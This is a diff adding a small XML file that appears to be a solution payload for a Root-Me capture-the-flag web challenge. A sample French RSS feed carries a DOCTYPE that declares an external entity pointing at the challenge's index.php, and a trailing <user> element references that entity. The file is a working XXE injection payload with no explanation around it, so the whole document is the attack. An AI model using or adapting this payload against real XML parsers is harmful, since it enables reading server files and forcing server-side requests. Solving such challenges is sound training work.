@@ -1,0 +1,14 @@
+<?xml version="1.0"?>
+<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY sp SYSTEM "http://challenge01.root-me.org/web-serveur/ch29/index.php">]>
+<rss version="2.0">
+    <channel>
+        <title>Exemple de flux RSS</title>
+        <link>http://xml.toutestfacile.com</link>
+        <description>Exemple de flux RSS pour XML Facile!</description>
+        <item>
+            <title>Exemple du jour</title>
+            <description>TEST</description>
+        </item>
+    </channel>
+</rss>
+<user>&sp;</user>
